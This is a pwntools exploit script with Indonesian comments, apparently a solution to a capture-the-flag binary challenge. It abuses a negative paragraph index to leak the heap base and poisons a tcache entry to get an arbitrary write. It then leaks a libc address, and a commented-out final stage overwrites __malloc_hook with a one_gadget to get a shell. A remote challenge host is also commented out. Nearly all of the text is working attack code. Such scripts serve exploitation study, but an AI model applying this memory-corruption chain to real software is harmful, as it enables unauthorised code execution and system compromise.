from pwn import * 

exe=ELF("./soal",checksec=False)
ld=ELF("./ld.so",checksec=False)
libc = ELF('./libc.so.6',checksec=False)

p = process([exe.path],env={"LD_PRELOAD":libc.path})

# p = remote("128.199.77.174",13339)
# p = remote("localhost",13339)

def tulis(banyak,tulisan,tulis=True):
	p.sendlineafter("Input:","1")
	p.sendline(str(banyak))
	if tulis == True:
		p.sendline(str(tulisan))

def awal(nama,banyak):
	p.sendlineafter("Nama :",str(nama))
	p.sendlineafter("paragraf : ",str(banyak))

def input(nomor):
	p.sendlineafter("Input:",str(nomor))

def yes():
	p.sendlineafter("(yes/no)?","yes")

# gdb.attach(p,"""
# 	b *main
# 	b *Tulis_Paragraf
# 	c
# 	""")

awal("JUNK",3)
input(3) # Membuat Index_Paragraf = 0 - 3 = -3
yes()

awal("JUNK",0)
tulis(30,"JUNK") # 0x404048 <Index_Paragraf>:      0x00000000001135ff
tulis(300,"",tulis=False) # Masukan lebih dari 200 atau kurang dari 0 untuk leak Index_Paragraf

p.recvuntil("Tulis diKolom ")
Heap_Base_Address=int(p.recvuntil(" ")[:-1])-1-0x2c1
print "Heap Base Address : " + str(hex(Heap_Base_Address))
input(2) # Membuat Index_Paragraf = 0
input(3) # untuk memakai function awal()
yes()

index= -(((Heap_Base_Address-0x404060)/8)+11)
print "Write ke address : " + str(hex(0x404060-(index)*8))
awal("JUNK",index) 
input(3) # Membuat Index_Paragraf = (Heap_base_address + 0x058)/8
yes()

awal("JUNK",0)
tulis(30,p64(0x404010)) # address 0x0000000001cfb350
# dibawah ini adalah area heap base address
# 0x1cfb000:      0x0000000000000000      0x0000000000000251
# 0x1cfb010:      0x0000000000000000      0x0000000000000000
# 0x1cfb020:      0x0000000000000000      0x0000000000000000
# 0x1cfb030:      0x0000000000000000      0x0000000000000000
# 0x1cfb040:      0x0000000000000000      0x0000000000000000
# 0x1cfb050:      0x0000000000000000      0x0000000001cfb350
# 0x1cfb060:      0x0000000000000000      0x0000000000000000

# jika kita memasukan seperti diatas Tcache binsnya akan kedetect

tulis(30,"JUNK")

input(3) # untuk memakai function awal()
yes()

awal("a"*15,0)
input(2) # Membuat Index_Paragraf = 0
input(3) # untuk memakai function awal() dan leak _IO_2_1_stdout_ Address

# p.recvuntil("aaaaaaaaaaaaaaa\n")
# leak_stdout=(p.recvuntil("berhasil")[:-8]).ljust(8,"\x00")
# leak_stdout=u64(leak_stdout)
# print " _IO_2_1_stdout_ Address : " + str(hex(leak_stdout))
# libc.address=leak_stdout - libc.sym["_IO_2_1_stdout_"]
# print "Libc base Address : " + str(hex(libc.address))
# malloc_hook= libc.sym["__malloc_hook"]
# print "__malloc_hook Address : " + str(hex(libc.address))
# one_gadget = libc.address + 0xe2383
# print "One_Gadget Address : " + str(hex(one_gadget))
# yes()

# index= -(((Heap_Base_Address-0x404060)/8)+11)
# awal("JUNK",index)
# input(3) # untuk memakai function awal()
# yes()

# # dibawah ini untuk menuliskan one_gadget ke malloc_hook 
# awal("JUNK",0)
# tulis(30,p64(malloc_hook))
# tulis(30,"JUNK")
# tulis(30,p64(one_gadget))
# tulis(30,"JUNK",tulis=False)


p.interactive()